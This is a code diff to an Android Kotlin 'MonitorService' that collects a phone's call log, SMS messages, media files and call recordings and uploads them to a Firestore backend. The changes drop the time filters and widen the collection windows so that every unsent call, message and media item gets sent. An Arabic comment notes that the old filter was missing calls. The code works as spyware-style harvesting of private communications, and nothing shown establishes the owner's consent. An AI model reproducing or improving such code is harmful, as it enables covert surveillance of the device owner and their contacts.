@@ -276,28 +276,26 @@ class MonitorService : Service() {
     }
 
     private fun syncRecentData() {
-        val last = prefs().getLong(LAST_RELAY_AT, 0L)
         val seenCalls = prefs().getStringSet(SEEN_CALLS, emptySet()) ?: emptySet()
         val newCalls = HashSet(seenCalls)
         if (Permissions.has(this, Manifest.permission.READ_CALL_LOG)) {
-            Collectors.callLog(this, 30).filter { (it["timestamp"] as? Long) ?: 0L > last }
-                .forEach { item ->
-                    val key = item["callId"]?.toString() ?: return@forEach
-                    if (newCalls.contains(key)) return@forEach
-                    newCalls.add(key)
-                    FirestoreSync.appendItem(this, "calls", item)
-                }
+            // لا نفلتر بالوقت: أي مكالمة لم تُرسل سابقاً تُرسل الآن (كان الفلتر يُسقط مكالمات كاملة)
+            Collectors.callLog(this, 60).forEach { item ->
+                val key = item["callId"]?.toString() ?: return@forEach
+                if (newCalls.contains(key)) return@forEach
+                newCalls.add(key)
+                FirestoreSync.appendItem(this, "calls", item)
+            }
         }
         val seenSms = prefs().getStringSet(SEEN_SMS, emptySet()) ?: emptySet()
         val newSms = HashSet(seenSms)
         if (Permissions.has(this, Manifest.permission.READ_SMS)) {
-            Collectors.messages(this, 30).filter { (it["timestamp"] as? Long) ?: 0L > last }
-                .forEach { item ->
-                    val key = item["smsId"]?.toString() ?: return@forEach
-                    if (newSms.contains(key)) return@forEach
-                    newSms.add(key)
-                    FirestoreSync.appendItem(this, "messages", item)
-                }
+            Collectors.messages(this, 40).forEach { item ->
+                val key = item["smsId"]?.toString() ?: return@forEach
+                if (newSms.contains(key)) return@forEach
+                newSms.add(key)
+                FirestoreSync.appendItem(this, "messages", item)
+            }
         }
         prefs().edit()
             .putStringSet(SEEN_CALLS, trim(newCalls))
@@ -320,9 +318,8 @@ class MonitorService : Service() {
         if (Permissions.mediaPermissions().none { Permissions.has(this, it) }) return
         val uploaded = prefs().getStringSet(UPLOADED_MEDIA, emptySet()) ?: emptySet()
         val newUploaded = HashSet(uploaded)
-        val last = prefs().getLong(LAST_MEDIA_AT, 0L)
-        val candidates = Collectors.media(this, 60)
-            .filter { (it["timestamp"] as? Long) ?: 0L > last }
+        val candidates = Collectors.media(this, 80)
+            .filter { !newUploaded.contains(it["mediaId"]?.toString()) }
             .take(10)
         for (item in candidates) {
             val id = item["mediaId"]?.toString() ?: continue
@@ -569,7 +566,8 @@ class MonitorService : Service() {
                     mapOf(
                         "number" to (number ?: ""),
                         "name" to lookupCallName(number.orEmpty()),
-                        "type" to "recorded",
+                        "type" to direction,
+                        "kind" to "recording",
                         "direction" to direction,
                         "duration" to 0,
                         "timestamp" to startedAt,
@@ -591,7 +589,8 @@ class MonitorService : Service() {
                 mapOf(
                     "number" to (number ?: ""),
                     "name" to name,
-                    "type" to "recorded",
+                    "type" to direction,
+                    "kind" to "recording",
                     "direction" to direction,
                     "duration" to duration,
                     "timestamp" to startedAt,
